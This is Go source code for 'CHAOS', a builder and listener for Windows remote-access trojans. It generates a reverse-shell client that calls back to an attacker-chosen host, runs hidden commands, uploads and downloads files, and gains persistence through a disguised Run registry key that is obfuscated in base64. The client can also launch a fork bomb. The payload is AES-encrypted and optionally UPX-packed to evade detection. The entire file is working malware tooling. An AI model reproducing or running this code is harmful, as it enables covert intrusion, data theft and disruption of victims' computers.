package main

import(
 "fmt"
 "runtime"
 "os"
 "os/exec"
 "bufio"
 "time"
 "net"
 "io/ioutil"
 "encoding/base64"
 "crypto/aes"
 "crypto/cipher"
 "crypto/rand"
 "io"
)

const BLACK      = "\x1b[30;1m"
const WHITE      = "\x1b[37;1m"
const RED        = "\x1b[31;1m"
const GREEN      = "\x1b[32;1m"
const YELLOW     = "\x1b[33;1m"
const BLUE       = "\x1b[34;1m"
const MAGENTA    = "\x1b[35;1m"
const CYAN       = "\x1b[36;1m"
const BG_RED     = "\x1b[41;1m"
const BG_GREEN   = "\x1b[42;1m"
const BG_YELLOW  = "\x1b[43;1m"
const BG_BLUE    = "\x1b[44;1m"
const BG_MAGENTA = "\x1b[45;1m"
const BG_CYAN    = "\x1b[46;1m"
const BG_BLACK   = "\x1b[40;1m"
const BG_WHITE   = "\x1b[47;1m"

const VERSION    = "1.0.2"

func main(){
 DetectOS()
 ClearScreen()
 ShowMenu()
}

func DetectOS(){
 if runtime.GOOS == "linux"{
  fmt.Println("[i] Linux!")
 }else if runtime.GOOS == "windows"{
   fmt.Println("[!] Windows are not supported!")
   os.Exit(0)
 }else{
   fmt.Println("[!] OS not supported!")
   os.Exit(0)
 }
}

func ClearScreen(){
 cmd := exec.Command("clear")
 cmd.Stdout = os.Stdout
 cmd.Run()
}

func ReadLine() string {
  buf := bufio.NewReader(os.Stdin)
  lin, _, err := buf.ReadLine()
  if err != nil {
    fmt.Println(RED, "[!] Error to Read Line!")
  }
  return string(lin)
}

func WaitTimeMenu(){
  go func() {
    time.Sleep(time.Second * 2)
    }()
    select {
    case <-time.After(time.Second * 2):
  }
}

func WaitTimeMenuFive(){
  go func() {
    time.Sleep(time.Second * 5)
    }()
    select {
    case <-time.After(time.Second * 5):
  }
}

func GeneratePath(str_size int) string {
  characters := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
  var bytes = make([]byte, str_size)
  rand.Read(bytes)
  for i, x := range bytes {
      bytes[i] = characters[x%byte(len(characters))]
  }
  return string(bytes)
}

func GenerateKey(Size int) string {
  characters := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%&*()_-"
  var bytes = make([]byte, Size)
  rand.Read(bytes)
  for i, x := range bytes {
      bytes[i] = characters[x%byte(len(characters))]
  }
  return string(bytes)
}

func GenerateNameFileTmp(Size int) string {
  characters := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
  var bytes = make([]byte, Size)
  rand.Read(bytes)
  for i, x := range bytes {
      bytes[i] = characters[x%byte(len(characters))]
  }
  return string(bytes)
}

func Encrypt(Key []byte, PlainCode []byte) string {
  Block, err := aes.NewCipher(Key)
  if err != nil {
    panic(err)
  }

  CipherCode := make([]byte, aes.BlockSize+len(PlainCode))
  Blk := CipherCode[:aes.BlockSize]
  if _, err := io.ReadFull(rand.Reader, Blk); err != nil {
    panic(err)
  }

  Stream := cipher.NewCFBEncrypter(Block, Blk)
  Stream.XORKeyStream(CipherCode[aes.BlockSize:], PlainCode)

  return base64.URLEncoding.EncodeToString(CipherCode)
}

func ShowName(){
  fmt.Println("")
  fmt.Println(RED, "▄████████    ▄█    █▄       ▄████████  ▄██████▄     ▄████████  ")
  fmt.Println(RED, "███    ███   ███    ███     ███    ███ ███    ███   ███    ███ ")
  fmt.Println(RED, "███    █▀    ███    ███     ███    ███ ███    ███   ███    █▀  ")
  fmt.Println(RED, "███         ▄███▄▄▄▄███▄▄   ███    ███ ███    ███   ███        ")
  fmt.Println(RED, "███        ▀▀███▀▀▀▀███▀  ▀███████████ ███    ███ ▀███████████ ")
  fmt.Println(RED, "███    █▄    ███    ███     ███    ███ ███    ███          ███ ")
  fmt.Println(RED, "███    ███   ███    ███     ███    ███ ███    ███    ▄█    ███ ")
  fmt.Println(RED, "████████▀    ███    █▀      ███    █▀   ▀██████▀   ▄████████▀  ")
}

func ShowMenu(){
 ClearScreen()
 ShowName()
 fmt.Println("")
 fmt.Println(GREEN, "                                                Version: " + VERSION)
 fmt.Println(CYAN, "                                         Author: tiagorlampert")
 fmt.Println("")
 fmt.Println(YELLOW, " [1] Generate")
 fmt.Println(YELLOW, " [2] Listen")
 fmt.Println(YELLOW, " [3] Quit")
 fmt.Println("")
 fmt.Print(WHITE, " Choose a Option: ")
 OPT := ReadLine()

 switch OPT {
 case "1":
   GenerateCode()
 case "2":
   RunServer()
 case "3":
   ClearScreen()
   os.Exit(0)
 }
  fmt.Println("")
  fmt.Print(RED, " [!] Invalid Option!")
  WaitTimeMenu()
  ShowMenu()
}

func GenerateCode(){
  ClearScreen()
  ShowName()
  fmt.Println("")
  fmt.Println(YELLOW, "GENERATE PAYLOAD")
  fmt.Println(YELLOW, "--------------------------")
  fmt.Println("")
  fmt.Print(YELLOW, " [*] Enter LHOST: ", WHITE)
  LHOST := ReadLine()
  if len(LHOST) < 7 {
    fmt.Println(RED, "[!] Invalid LHOST!")
  } else if len(LHOST) > 15 {
    fmt.Println(RED, "[!] Invalid LHOST!")
    WaitTimeMenu()
    GenerateCode()
  }

  fmt.Print(YELLOW, " [*] Enter LPORT: ", WHITE)
  LPORT := ReadLine()
  if len(LPORT) == 0 {
    LPORT := "8080"
    fmt.Println(GREEN, "[+] DEFAULT LPORT (" + LPORT + ")")
  }else if(len(LPORT) < 2){
    fmt.Println(RED, "[!] Invalid LPORT!")
    WaitTimeMenu()
    GenerateCode()
  }

  fmt.Print(YELLOW, " [*] Enter name for file (.exe): ", WHITE)
  NAME := ReadLine()
  for len(NAME) == 0 {
    fmt.Println(RED, "[!] Invalid Name!")
    fmt.Print(YELLOW, " [*] Enter name for file (.exe): ", WHITE)
    NAME = ReadLine()
  }

  pathPersistence := GeneratePath(8)
  genCode, _ := os.Create(string(NAME) + ".go")
  genCode.WriteString("package main\r\n")
  genCode.WriteString("import (\r\n")
  genCode.WriteString("\"net\"\r\n")
  genCode.WriteString("\"fmt\"\r\n")
  genCode.WriteString("\"bufio\"\r\n")
  genCode.WriteString("\"os\"\r\n")
  genCode.WriteString("\"os/exec\"\r\n")
  genCode.WriteString("\"encoding/base64\"\r\n")
  genCode.WriteString("\"io/ioutil\"\r\n")
  genCode.WriteString("\"syscall\"\r\n")
  genCode.WriteString("\"time\"\r\n")
  genCode.WriteString(")\r\n")
  genCode.WriteString("const IP = \"" + string(LHOST) + ":" + string(LPORT) + "\"\r\n")
  genCode.WriteString("const fileName = \"" + NAME + ".exe\"\r\n")
  genCode.WriteString("const folderPath = \"C:\\\\ProgramData\"\r\n")
  genCode.WriteString("const folderExt = \"\\\\" + string(pathPersistence) + "\"\r\n")
  genCode.WriteString("func main() {\r\n")
  genCode.WriteString("WaitTimeMenu()\r\n")
  genCode.WriteString("for{\r\n")
  genCode.WriteString("connect()\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("func WaitTimeMenu(){\r\n")
  genCode.WriteString("go func() {\r\n")
  genCode.WriteString("time.Sleep(time.Second * 35)\r\n")
  genCode.WriteString("}()\r\n")
  genCode.WriteString("select {\r\n")
  genCode.WriteString("case <-time.After(time.Second * 35):\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("func connect(){\r\n")
  genCode.WriteString("conn, err := net.Dial(\"tcp\", IP)\r\n")
  genCode.WriteString("if err != nil {\r\n")
  genCode.WriteString("fmt.Println(\"Connecting...\")\r\n")
  genCode.WriteString("for{\r\n")
  genCode.WriteString("connect()\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("for{\r\n")
  genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("fmt.Println(command)\r\n")
  genCode.WriteString("decodedCase, _ := base64.StdEncoding.DecodeString(command)\r\n")
  genCode.WriteString("fmt.Print(string(decodedCase))\r\n")
  genCode.WriteString("switch string(decodedCase) {\r\n")
  genCode.WriteString("case \"back\":\r\n")
  genCode.WriteString("conn.Close()\r\n")
  genCode.WriteString("connect()\r\n")
  genCode.WriteString("case \"exit\":\r\n")
  genCode.WriteString("conn.Close()\r\n")
  genCode.WriteString("os.Exit(0)\r\n")
  genCode.WriteString("case \"download\":\r\n")
  genCode.WriteString("download, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("decodeDownload, _ := base64.StdEncoding.DecodeString(download)\r\n")
  genCode.WriteString("file, err := ioutil.ReadFile(string(decodeDownload))\r\n")
  genCode.WriteString("if err != nil {\r\n")
  genCode.WriteString("conn.Write([]byte(\"[!] File not found!\" + \"\\n\"))\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("encData := base64.URLEncoding.EncodeToString(file)\r\n")
  genCode.WriteString("conn.Write([]byte(string(encData) + \"\\n\"))\r\n")
  genCode.WriteString("fmt.Println(encData)\r\n")
  genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("fmt.Println(command)\r\n")
  genCode.WriteString("case \"upload\":\r\n")
  genCode.WriteString("uploadOutput, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("decodeOutput, _ := base64.StdEncoding.DecodeString(uploadOutput)\r\n")
  genCode.WriteString("encData, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("decData, _ := base64.URLEncoding.DecodeString(encData)\r\n")
  genCode.WriteString("ioutil.WriteFile(string(decodeOutput), []byte(decData), 777)\r\n")
  genCode.WriteString("case \"getos\":\r\n")
  genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"wmic os get name\")\r\n")
  genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
  genCode.WriteString("c, _ := cmd.Output()\r\n")
  genCode.WriteString("encoded := base64.StdEncoding.EncodeToString(c)\r\n")
  genCode.WriteString("conn.Write([]byte(string(encoded) + \"\\n\"))\r\n")
  genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("fmt.Println(command)\r\n")
  genCode.WriteString("case \"lockscreen\":\r\n")
  genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"rundll32.exe user32.dll,LockWorkStation\")\r\n")
  genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
  genCode.WriteString("c, _ := cmd.Output()\r\n")
  genCode.WriteString("fmt.Println(string(c))\r\n")
  genCode.WriteString("encoded := base64.StdEncoding.EncodeToString([]byte(\"-> Locked!\"))\r\n")
  genCode.WriteString("conn.Write([]byte(string(encoded) + \"\\n\"))\r\n")
  genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("fmt.Println(command)\r\n")
  genCode.WriteString("case \"ls\":\r\n")
  genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"dir\")\r\n")
  genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
  genCode.WriteString("c, _ := cmd.Output()\r\n")
  genCode.WriteString("encoded := base64.StdEncoding.EncodeToString(c)\r\n")
  genCode.WriteString("conn.Write([]byte(string(encoded) + \"\\n\"))\r\n")
  genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("fmt.Println(command)\r\n")
  genCode.WriteString("case \"persistence enable\":\r\n")
  genCode.WriteString("os.MkdirAll(folderPath + folderExt, 0777)\r\n")
  genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"xcopy /Y \" + fileName + \" \" + folderPath + folderExt)\r\n")
  genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
  genCode.WriteString("c, _ := cmd.Output()\r\n")
  genCode.WriteString("encoded := base64.StdEncoding.EncodeToString(c)\r\n")
  genCode.WriteString("fmt.Println(encoded)\r\n")
  decodedCommand, _ := base64.StdEncoding.DecodeString("c3RhcnR1cFJlZyA6PSAiUkVHIEFERCBIS0NVXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuIC9WIFwiTWljcm9zb2Z0IENvcnBvcmF0aW9uXCIgL3QgUkVHX1NaIC9GIC9EICIgKyAiXCIiICsgZm9sZGVyUGF0aCArIGZvbGRlckV4dCArICJcXCIgKyBmaWxlTmFtZSArICJcIiI=")
  // startupReg := "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Microsoft Corporation\" /t REG_SZ /F /D " + "\"" + folderPath + folderExt + "\\" + fileName + "\""
  genCode.WriteString(string(decodedCommand) + "\r\n")
  genCode.WriteString("batReg, _ := os.Create(folderPath + folderExt +  \"\\\\reg.bat\")\r\n")
  genCode.WriteString("batReg.WriteString(string(startupReg))\r\n")
  genCode.WriteString("batReg.Close()\r\n")
  genCode.WriteString("execBatReg := exec.Command(\"cmd\", \"/C\", folderPath + folderExt + \"\\\\reg.bat\");\r\n")
  genCode.WriteString("execBatReg.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
  genCode.WriteString("execBatReg.Run();\r\n")
  genCode.WriteString("statusPersistenceSuccess := base64.StdEncoding.EncodeToString([]byte(\"[*] Persistence Enabled!\"))\r\n")
  genCode.WriteString("statusPersistenceFailed := base64.StdEncoding.EncodeToString([]byte(\"[!] Persistence Failed!\"))\r\n")
  genCode.WriteString("file := folderPath + folderExt + \"\\\\\" + fileName\r\n")
  genCode.WriteString("_, err := os.Stat(file)\r\n")
  genCode.WriteString("if err == nil {\r\n")
  genCode.WriteString("conn.Write([]byte(statusPersistenceSuccess + \"\\n\"))\r\n")
  genCode.WriteString("} else if os.IsNotExist(err) {\r\n")
  genCode.WriteString("for{\r\n")
  genCode.WriteString("conn.Write([]byte(statusPersistenceFailed + \"\\n\"))\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("fmt.Println(command)\r\n")
  genCode.WriteString("case \"persistence disable\":\r\n")
  genCode.WriteString("os.RemoveAll(folderPath + folderExt)\r\n")
  genCode.WriteString("startupReg := \"REG DELETE HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /V \\\"Microsoft Corporation\\\" /F\"\r\n")
  genCode.WriteString("fmt.Println(startupReg)\r\n")
  genCode.WriteString("batReg, _ := os.Create(folderPath + \"\\\\reg.bat\")\r\n")
  genCode.WriteString("batReg.WriteString(string(startupReg))\r\n")
  genCode.WriteString("batReg.Close()\r\n")
  genCode.WriteString("execBatReg := exec.Command(\"cmd\", \"/C\", folderPath + \"\\\\reg.bat\");\r\n")
  genCode.WriteString("execBatReg.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
  genCode.WriteString("execBatReg.Run();\r\n")
  genCode.WriteString("statusPersistenceSuccess := base64.StdEncoding.EncodeToString([]byte(\"[*] Persistence Disabled!\"))\r\n")
  genCode.WriteString("statusPersistenceFailed := base64.StdEncoding.EncodeToString([]byte(\"[*] Persistence Failed!\"))\r\n")
  genCode.WriteString("if _, err := os.Stat(folderPath + folderExt); os.IsNotExist(err) {\r\n")
  genCode.WriteString("conn.Write([]byte(statusPersistenceSuccess + \"\\n\"))\r\n")
  genCode.WriteString("}else{\r\n")
  genCode.WriteString("conn.Write([]byte(statusPersistenceFailed + \"\\n\"))\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("fmt.Println(command)\r\n")
  genCode.WriteString("case \"bomb\":\r\n")
  genCode.WriteString("forkBombCommand := \"%0|%0\"\r\n")
  genCode.WriteString("forkBomb, _ := os.Create(folderPath + \"\\\\bomb.bat\")\r\n")
  genCode.WriteString("forkBomb.WriteString(string(forkBombCommand))\r\n")
  genCode.WriteString("forkBomb.Close()\r\n")
  genCode.WriteString("execForkBomb := exec.Command(\"cmd\", \"/C\", folderPath + \"\\\\bomb.bat && del \" + folderPath + \"\\\\bomb.bat\");\r\n")
  genCode.WriteString("execForkBomb.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
  genCode.WriteString("execForkBomb.Run();\r\n")
  genCode.WriteString("statusMessageForkBomb := base64.StdEncoding.EncodeToString([]byte(\"[*] Executed Fork Bomb!\"))\r\n")
  genCode.WriteString("conn.Write([]byte(statusMessageForkBomb + \"\\n\"))\r\n")
  genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("fmt.Println(command)\r\n")
  genCode.WriteString("case \"openurl\":\r\n")
  genCode.WriteString("url, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("decodeUrl, _ := base64.StdEncoding.DecodeString(url)\r\n")
  genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", \"start \" + string(decodeUrl));\r\n")
  genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
  genCode.WriteString("cmd.Run();\r\n")
  genCode.WriteString("status := base64.StdEncoding.EncodeToString([]byte(\"[*] Opened!\"))\r\n")
  genCode.WriteString("conn.Write([]byte(status + \"\\n\"))\r\n")
  genCode.WriteString("command, _ := bufio.NewReader(conn).ReadString('\\n')\r\n")
  genCode.WriteString("fmt.Println(command)\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("cmd := exec.Command(\"cmd\", \"/C\", command)\r\n")
  genCode.WriteString("cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}\r\n")
  genCode.WriteString("c, _ := cmd.Output()\r\n")
  genCode.WriteString("encoded := base64.StdEncoding.EncodeToString(c)\r\n")
  genCode.WriteString("conn.Write([]byte(string(encoded) + \"\\n\"))\r\n")
  genCode.WriteString("_, err := conn.Read(make([]byte, 0))\r\n")
  genCode.WriteString("if err != nil{\r\n")
  genCode.WriteString("connect()\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("}\r\n")
  genCode.WriteString("}\r\n")
  genCode.Close()

  fmt.Println("")
  fmt.Println(GREEN, "[*] Compiling...")
  exec.Command("sh","-c", "GOOS=windows GOARCH=386 go build -ldflags \"-H=windowsgui\" " + string(NAME) + ".go").Output()

  Key := GenerateKey(32)
  KeyByte := []byte(Key)
  FileTmp := GenerateNameFileTmp(8)

  PlainCode, err := ioutil.ReadFile(string(NAME) + ".exe")
  if err != nil {
    panic(err)
  }
  CryptedCode := Encrypt(KeyByte, PlainCode)

  finalCode, _ := os.Create(string(NAME) + ".go")
  finalCode.WriteString("package main\r\n")
  finalCode.WriteString("import (\r\n")
  finalCode.WriteString("\"crypto/aes\"\r\n")
  finalCode.WriteString("\"crypto/cipher\"\r\n")
  finalCode.WriteString("\"encoding/base64\"\r\n")
  finalCode.WriteString("\"fmt\"\r\n")
  finalCode.WriteString("\"io/ioutil\"\r\n")
  finalCode.WriteString("\"os/exec\"\r\n")
  finalCode.WriteString("\"os\"\r\n")
  finalCode.WriteString("\"syscall\"\r\n")
  finalCode.WriteString("\"time\"\r\n")
  finalCode.WriteString(")\r\n")
  finalCode.WriteString("const key = \"" + Key + "\"\r\n")
  finalCode.WriteString("const code = \"" + CryptedCode + "\"\r\n")
  finalCode.WriteString("func main() {\r\n")
  finalCode.WriteString("WaitTimeMenu()\r\n")
  finalCode.WriteString("DecryptCode := Decrypt([]byte(key), code)\r\n")
  finalCode.WriteString("PathTmp := os.TempDir()\r\n")
  finalCode.WriteString("ioutil.WriteFile(PathTmp + \"\\\\" + FileTmp + ".exe\", []byte(DecryptCode), 777)\r\n")
  finalCode.WriteString("run := exec.Command(\"cmd\", \"/C\", PathTmp + \"\\\\" + FileTmp + ".exe\");\r\n")
  finalCode.WriteString("run.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};\r\n")
  finalCode.WriteString("run.Run();\r\n")
  finalCode.WriteString("}\r\n")
  finalCode.WriteString("func Decrypt(Key []byte, CryptoCode string) string {\r\n")
  finalCode.WriteString("CipherCode, _ := base64.URLEncoding.DecodeString(CryptoCode)\r\n")
  finalCode.WriteString("Block, err := aes.NewCipher(Key)\r\n")
  finalCode.WriteString("if err != nil {\r\n")
  finalCode.WriteString("panic(err)\r\n")
  finalCode.WriteString("}\r\n")
  finalCode.WriteString("Blk := CipherCode[:aes.BlockSize]\r\n")
  finalCode.WriteString("CipherCode = CipherCode[aes.BlockSize:]\r\n")
  finalCode.WriteString("Stream := cipher.NewCFBDecrypter(Block, Blk)\r\n")
  finalCode.WriteString("Stream.XORKeyStream(CipherCode, CipherCode)\r\n")
  finalCode.WriteString("return fmt.Sprintf(\"%s\", CipherCode)\r\n")
  finalCode.WriteString("}\r\n")
  finalCode.WriteString("func WaitTimeMenu(){\r\n")
  finalCode.WriteString("go func() {\r\n")
  finalCode.WriteString("time.Sleep(time.Second * 35)\r\n")
  finalCode.WriteString("}()\r\n")
  finalCode.WriteString("select {\r\n")
  finalCode.WriteString("case <-time.After(time.Second * 35):\r\n")
  finalCode.WriteString("}\r\n")
  finalCode.WriteString("}\r\n")
  finalCode.Close()

  exec.Command("sh","-c", "GOOS=windows GOARCH=386 go build -ldflags \"-H=windowsgui\" " + string(NAME) + ".go").Output()
  fmt.Println(GREEN, "[*] Generated \"" + string(NAME) + ".exe\"")
  fmt.Println("")

  fmt.Print(YELLOW, "Compress the payload with UPX? (y/N): ", WHITE)
  UPX := ReadLine()
  if len(UPX) == 0 {
    UPX = "n"
  }
  if(UPX == "y" || UPX == "Y"){
    UPXOUT, _ := exec.Command("sh","-c", "upx --force " + string(NAME) + ".exe").Output()
    fmt.Println("")
    fmt.Println(string(UPXOUT))
    WaitTimeMenuFive()
  }else if(UPX == "n" || UPX == "N"){
    fmt.Println(WHITE, "[!] Not Compress!")
  }else{
    fmt.Println(RED, "[!] Invalid Option!")
    WaitTimeMenu()
  }
  fmt.Println("")
  fmt.Print(YELLOW, "Start Listener Now? (Y/n): ", WHITE)
  LISTENER := ReadLine()
  if(LISTENER == "y" || LISTENER == "Y"){
    RunServer()
  }else if(LISTENER == "n" || LISTENER == "N"){
    ShowMenu()
  }else{
    RunServer()
  }
}

func RunServer(){
  ClearScreen()
  ShowName()
  fmt.Println("")
  fmt.Println(YELLOW, "START LISTENER")
  fmt.Println(YELLOW, "--------------------------")
  fmt.Println("")
  fmt.Print(YELLOW, " [*] Enter LPORT: ", WHITE)
  LPORT := ReadLine()
  if(len(LPORT) == 0){
    LPORT := "8080"
    fmt.Println(GREEN, "[+] DEFAULT LPORT DEFINED (" + LPORT + ")")
  }else if(len(LPORT) < 2){
    fmt.Println(RED, "[!] Invalid LPORT!")
    WaitTimeMenu()
    GenerateCode()
  }
  fmt.Println("")
  fmt.Println(CYAN, "[*] Waiting for connection...")
  ln, _ := net.Listen("tcp", ":" + LPORT)
  conn, _ := ln.Accept()
  fmt.Println(GREEN, "[+] Connected!")
  fmt.Println("")

  for{
    fmt.Print(RED, "CHAOS ", WHITE, "> ")
    command := ReadLine()

    switch command {
      case "help":
       fmt.Println("")
       fmt.Println(CYAN, "COMMANDS              DESCRIPTION")
       fmt.Println(CYAN, "-------------------------------------------------------")
       fmt.Println(CYAN, "download            - File Download")
       fmt.Println(CYAN, "upload              - File Upload")
       fmt.Println(CYAN, "persistence enable  - Install at Startup")
       fmt.Println(CYAN, "persistence disable - Remove from Startup")
       fmt.Println(CYAN, "getos               - Get Operating System Name")
       fmt.Println(CYAN, "lockscreen          - Lock the Screen")
       fmt.Println(CYAN, "openurl             - Open the URL Informed")
       fmt.Println(CYAN, "bomb                - Run Fork Bomb")
       fmt.Println(CYAN, "clear               - Clear the Screen")
       fmt.Println(CYAN, "back                - Close Connection but Keep Running")
       fmt.Println(CYAN, "exit                - Close Connection and exit")
       fmt.Println(CYAN, "help                - Show this Help")
       fmt.Println(CYAN, "-------------------------------------------------------")
       fmt.Println("")

     case "clear":
       ClearScreen()

     case "back":
       encBack := base64.URLEncoding.EncodeToString([]byte("back"))
       conn.Write([]byte(encBack + "\n"))
       conn.Close()
       os.Exit(0)

     case "exit":
       encExit := base64.URLEncoding.EncodeToString([]byte("exit"))
       conn.Write([]byte(encExit + "\n"))
       os.Exit(0)

     case "download":
       encDownload := base64.URLEncoding.EncodeToString([]byte("download"))
       conn.Write([]byte(encDownload + "\n"))

       fmt.Print("File Path to Download: ")
       nameDownload := ReadLine()
       encName := base64.URLEncoding.EncodeToString([]byte(nameDownload))
       conn.Write([]byte(encName + "\n"))

       fmt.Print("Output name: ")
       outputName := ReadLine()

       encData, _ := bufio.NewReader(conn).ReadString('\n')

       fmt.Println("-> Downloading...")
       decData, _ := base64.URLEncoding.DecodeString(encData)
       ioutil.WriteFile(string(outputName), []byte(decData), 777)

     case "upload":
       encUpload := base64.URLEncoding.EncodeToString([]byte("upload"))
       conn.Write([]byte(encUpload + "\n"))

       fmt.Print("File Path to Upload: ")
       pathUpload := ReadLine()

       fmt.Print("Output name: ")
       outputName := ReadLine()
       encOutput := base64.URLEncoding.EncodeToString([]byte(outputName))
       conn.Write([]byte(encOutput + "\n"))

       fmt.Println("-> Uploading...")

       file, err := ioutil.ReadFile(pathUpload)
       if err != nil {
         fmt.Println(RED, "[!] File not found!")
       }
       encData := base64.URLEncoding.EncodeToString(file)
       conn.Write([]byte(string(encData) + "\n"))

     case "getos":
       getAv := base64.URLEncoding.EncodeToString([]byte("getos"))
       conn.Write([]byte(getAv + "\n"))
       message, _ := bufio.NewReader(conn).ReadString('\n')
       decoded, _ := base64.StdEncoding.DecodeString(message)
       fmt.Print(string(decoded))

     case "lockscreen":
       lookScreen := base64.URLEncoding.EncodeToString([]byte("lockscreen"))
       conn.Write([]byte(lookScreen + "\n"))
       message, _ := bufio.NewReader(conn).ReadString('\n')
       decoded, _ := base64.StdEncoding.DecodeString(message)
       fmt.Println(YELLOW, string(decoded))

     case "ls":
       lookScreen := base64.URLEncoding.EncodeToString([]byte("ls"))
       conn.Write([]byte(lookScreen + "\n"))
       message, _ := bufio.NewReader(conn).ReadString('\n')
       decoded, _ := base64.StdEncoding.DecodeString(message)
       fmt.Println(string(decoded))

     case "persistence enable":
       persistence := base64.URLEncoding.EncodeToString([]byte("persistence enable"))
       conn.Write([]byte(persistence + "\n"))
       message, _ := bufio.NewReader(conn).ReadString('\n')
       decoded, _ := base64.StdEncoding.DecodeString(message)
       fmt.Println(GREEN, string(decoded))

     case "persistence disable":
       persistence := base64.URLEncoding.EncodeToString([]byte("persistence disable"))
       conn.Write([]byte(persistence + "\n"))
       message, _ := bufio.NewReader(conn).ReadString('\n')
       decoded, _ := base64.StdEncoding.DecodeString(message)
       fmt.Println(YELLOW, string(decoded))

     case "bomb":
       persistence := base64.URLEncoding.EncodeToString([]byte("bomb"))
       conn.Write([]byte(persistence + "\n"))
       message, _ := bufio.NewReader(conn).ReadString('\n')
       decoded, _ := base64.StdEncoding.DecodeString(message)
       fmt.Println(YELLOW, string(decoded))

     case "openurl":
       encDownload := base64.URLEncoding.EncodeToString([]byte("openurl"))
       conn.Write([]byte(encDownload + "\n"))
       fmt.Print("Type URL to Open: ")
       url := ReadLine()
       encUrl := base64.URLEncoding.EncodeToString([]byte(url))
       conn.Write([]byte(encUrl + "\n"))
       message, _ := bufio.NewReader(conn).ReadString('\n')
       decoded, _ := base64.StdEncoding.DecodeString(message)
       fmt.Println(YELLOW, string(decoded))
    }

    if(command != "help"){
    conn.Write([]byte(command + "\n"))

    message, _ := bufio.NewReader(conn).ReadString('\n')
    decoded, _ := base64.StdEncoding.DecodeString(message)
    fmt.Print(string(decoded))
    }
  }
}
